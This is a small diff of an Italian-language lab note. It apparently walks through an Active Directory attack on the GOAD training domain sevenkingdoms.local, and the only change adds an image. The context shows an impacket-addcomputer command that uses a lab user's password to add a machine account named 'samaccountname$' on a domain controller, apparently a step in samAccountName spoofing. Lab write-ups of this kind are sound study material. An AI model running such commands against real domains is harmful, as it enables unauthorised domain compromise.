@@ -109,3 +109,4 @@ Ora aggiungiamo il nuovo computer al domain
 ```bash
 impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
+![[Pasted image 20230825162234.png]]
